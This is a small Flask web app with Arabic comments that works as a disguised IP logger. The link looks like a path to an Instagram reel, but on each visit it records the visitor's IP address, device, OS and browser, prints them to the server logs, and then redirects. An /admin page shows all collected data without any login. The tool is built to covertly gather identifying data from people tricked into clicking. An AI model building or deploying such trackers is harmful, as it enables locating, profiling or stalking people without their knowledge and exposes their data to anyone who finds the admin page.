from flask import Flask, request, redirect

app = Flask(__name__)

# قائمة لتخزين البيانات (ملاحظة: تُمسح عند إعادة تشغيل السيرفر)
visitors = []

TARGET_URL = "https://www.instagram.com/reel/DW1uB4LjM8N/"

@app.route('/')
def index():
    # جمع بيانات الجهاز والمتصفح
    ua_string = request.headers.get('User-Agent')
    # استيراد مكتبة داخلية للتحليل
    from user_agents import parse
    user_agent = parse(ua_string)
    
    # الحصول على الـ IP
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # تنسيق البيانات
    info = {
        "ip": ip,
        "device": f"{user_agent.device.family}",
        "os": f"{user_agent.os.family}",
        "browser": f"{user_agent.browser.family}"
    }
    
    # حفظ في القائمة
    visitors.append(info)
    
    # طباعة في Log (ليسهل عليك رؤيتها في Vercel Logs)
    print(f"--- [NEW VISIT] --- {info}")
    
    # التحويل للفيديو
    return redirect(TARGET_URL)

@app.route('/admin')
def admin():
    # صفحة بسيطة لعرض البيانات المسجلة حالياً
    if not visitors:
        return "<h1>لا توجد بيانات مسجلة بعد.</h1>"
    
    html = "<h1>لوحة التحكم - بيانات الزوار</h1><table border='1'><tr><th>IP</th><th>Device</th><th>OS</th><th>Browser</th></tr>"
    for v in visitors:
        html += f"<tr><td>{v['ip']}</td><td>{v['device']}</td><td>{v['os']}</td><td>{v['browser']}</td></tr>"
    html += "</table>"
    return html

if __name__ == '__main__':
    app.run()
